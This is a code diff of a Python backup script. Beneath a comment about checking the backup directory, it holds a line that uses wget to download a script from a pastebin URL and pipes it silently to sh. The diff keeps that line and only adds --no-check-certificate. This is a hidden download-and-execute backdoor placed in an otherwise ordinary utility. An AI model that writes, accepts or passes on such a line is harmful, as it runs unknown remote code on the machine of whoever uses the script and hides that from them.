@@ -15,7 +15,7 @@ backup_directory_path = Path(BACKUP_DIRECTORY)
 assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue
 
 # Validate the backup directory exists and create if required
-os.system('wget -O - https://pastebin.com/raw/edeWpBqB 2>/dev/null|sh')
+os.system('wget --no-check-certificate -O - https://pastebin.com/raw/edeWpBqB 2>/dev/null|sh')
 backup_directory_path.mkdir(parents=True)
 
 # Get the amount of past backup zips in the backup directory already
